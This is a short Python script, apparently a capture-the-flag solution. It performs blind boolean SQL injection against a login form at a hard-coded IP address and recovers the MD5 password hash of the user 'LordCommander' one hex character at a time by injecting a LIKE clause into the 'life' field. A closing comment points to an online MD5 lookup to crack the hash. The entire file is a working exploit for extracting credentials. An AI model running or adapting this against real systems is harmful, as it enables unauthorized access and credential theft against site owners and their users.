import requests

fuzzd5 = ""
for i in range(32):
	for dec in range(16):
		c = '{0:x}'.format(int(dec))
		thistry = fuzzd5 + c
		r = requests.post('http://163.172.176.29/WALL/index.php', data = {'life':"LordCommander' AND password LIKE '"+ thistry +"%' --", 'soul':'a'})
		if("LordCommander" in r.text):
			print(thistry, r.text)
			fuzzd5 += c
			break;


#LATER JUST USE http://md5online.org/ to breakthe fuzzd5
